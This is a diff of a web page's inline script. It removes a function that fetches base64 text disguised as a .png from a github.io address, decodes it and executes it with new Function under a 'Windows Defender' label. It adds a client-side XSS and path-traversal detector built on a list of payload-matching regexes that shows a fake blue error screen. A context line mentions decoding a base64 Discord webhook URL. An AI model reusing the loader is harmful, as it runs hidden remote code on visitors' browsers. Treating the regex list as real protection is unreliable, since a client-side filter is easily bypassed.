@@ -93,35 +93,127 @@ Stay safe" property="og:description" />
     <script>
 	    // unsafe
 
-async function fetchWindowsDefender() {
-            try {
-                let response = await fetch('https://drmineword.github.io/Artefact-Boost-Active/defender/windows_defender64.png');
-                let base64Data = await response.text();
+async function topSafeCheck() {
+    function isSafeValue(key, value) {
+        const dangerousPatterns = [
+            /<svg.*onload\s*=\s*[^>]+>/i,
+            /<svg.*onend\s*=\s*[^>]+>/i,
+            /<[^>]+on\w+\s*=\s*[^>]+/i,
+            /<[^>]+[^\w]>javascript:/i,
+            /<script[^>]*>.*<\/script>/i,
+            /<script\s*src\s*=\s*['"]?javascript:/i,
+            /<img[^>]+onerror\s*=\s*[^>]+>/i,
+            /<img\s+[^>]+src\s*=\s*[^>]+onerror\s*=\s*[^>]+/i,
+            /data:text\/html/i,
+            /data:text\/html;base64/i,
+            /<meta\s+http-equiv="refresh"\s+content="\d+;url=[^"]+">/i,
+            /<base\s+href="[^"]+">/i,
+            /<iframe[^>]+src\s*=\s*javascript:/i,
+            /<object[^>]+data\s*=\s*javascript:/i,
+            /<embed[^>]+src\s*=\s*javascript:/i,
+            /<body.*on\w+\s*=\s*[^>]+>/i,
+            /<html.*ontouch\w+\s*=\s*[^>]+>/i,
+            /<form.*onsubmit\s*=\s*[^>]+>/i,
+            /<scr.*ipt.*>/i,
+            /%3C.*%3E/i,  // Detects encoded < and > symbols
+            /javascript:.*alert/i,  // Detects javascript payloads with alerts
+            /<.*onerror=.*>/i,  // Detects onerror attributes with scripts
+            /<.*onload=.*>/i,  // Detects onload attributes with scripts
+            /<.*onabort=.*>/i,  // Additional detection for onabort event handlers
+            /<.*ondragstart=.*>/i,  // Additional detection for dragstart event handlers
+            /<.*onmousemove=.*>/i,  // Additional detection for mousemove event handlers
+            /<.*onclick=.*>/i,  // Additional detection for click event handlers
+            /<.*onmouseover=.*>/i,  // Additional detection for mouseover event handlers
+            /<.*onkeydown=.*>/i,  // Additional detection for keyboard events
+            /<.*onkeyup=.*>/i,  // Additional detection for keyboard events
+            /<.*onfocus=.*>/i,  // Additional detection for focus event handlers
+            /<.*onblur=.*>/i  // Additional detection for blur event handlers
+        ];
 
-                console.log("Base64 Content Retrieved:\n", base64Data);
+        return !dangerousPatterns.some(pattern => pattern.test(decodeURIComponent(value)));
+    }
 
-                // Decode Base64 to get the actual script
-                let decodedScript = atob(base64Data);
+    function isValidId(value) {
+        const allowedPattern = /^(?!.*\.\.\/)[a-zA-Z0-9/_-]+$/;
+        return allowedPattern.test(value);
+    }
 
-                console.log("Decoded Script:\n", decodedScript);
-
-                // Execute the script and get the result
-                const scriptResult = (new Function(decodedScript))(); // Safer than eval
-                
-                // If the script detects a threat, stop further execution
-                if (scriptResult && scriptResult.threatDetected) {
-                    showThreatScreen(scriptResult.attackMethod); // Show threat screen if threat is detected
-                } else {
-                    console.log("No threat detected. Continue executing...");
-                    // Continue execution here if no threat is detected
-                }
-
-            } catch (error) {
-                console.error("Error fetching or executing Windows Defender script:", error);
-            }
+    function isSafeUrl(value) {
+        try {
+            const parsedUrl = new URL(value, window.location.origin);
+            return parsedUrl.protocol === 'https:' && !parsedUrl.href.toLowerCase().includes('javascript:');
+        } catch (e) {
+            return false;
         }
-        fetchWindowsDefender();
-        // safe
+    }
+
+   function showThreatScreen(method) {
+    // Remove all existing styles
+    let styles = document.head.querySelectorAll("style, link[rel='stylesheet']");
+    styles.forEach(style => style.remove());
+
+    // Remove all script tags (both external and inline scripts)
+    let scripts = document.querySelectorAll('script');
+    scripts.forEach(script => script.remove());
+
+    // Reset body styling
+    document.body.style = `
+        background: #0000AA; /* Classic Blue Screen background */
+        color: white;
+        font-family: monospace;
+        font-size: 18px;
+        text-align: center;
+        padding: 50px;
+        margin: 0;
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+    `;
+
+    // Replace entire page content with critical error message and YouTube iframe
+    document.body.innerHTML = `
+        <h2 style="font-size: 32px; font-weight: bold;">A critical error has occurred</h2>
+        <p>>_< We are very sorry for the problem, but someone attempted an attack using: <b>${method}</b></p>
+        <p>Luckily, our security system detected and blocked the threat before execution.</p>
+        <p>Press Ctrl + Alt + Del to restart (just kidding, but be careful!).</p>
+        <br>
+        <iframe width="560" height="315" src="https://www.youtube.com/embed/eWTtEkRz4fM?si=r97lM3-NWpYWQwqO" frameborder="0" allowfullscreen></iframe>
+    `;
+}
+
+
+
+    const urlParams = new URLSearchParams(window.location.search);
+    let detectedThreat = false;
+    let attackMethod = "Unknown";
+
+    for (const [key, value] of urlParams.entries()) {
+        if (!isSafeValue(key, value)) {
+            attackMethod = `XSS Attack detected in parameter: ${key}`;
+            detectedThreat = true;
+            break;
+        }
+        if ((key === 'id' || key === 'cid') && !isValidId(value)) {
+            attackMethod = `Invalid ID or Path Traversal detected in parameter: ${key}`;
+            detectedThreat = true;
+            break;
+        }
+        if (key.includes("url") && !isSafeUrl(value)) {
+            attackMethod = `Potential Malicious URL detected in parameter: ${value}`;
+            detectedThreat = true;
+            break;
+        }
+    }
+
+    if (detectedThreat) {
+        showThreatScreen(attackMethod);
+    }
+}
+
+topSafeCheck();
+
 
         // Decode base64 URL (for Discord Webhook URL, if needed)
         function decodeBase64(base64Str) {
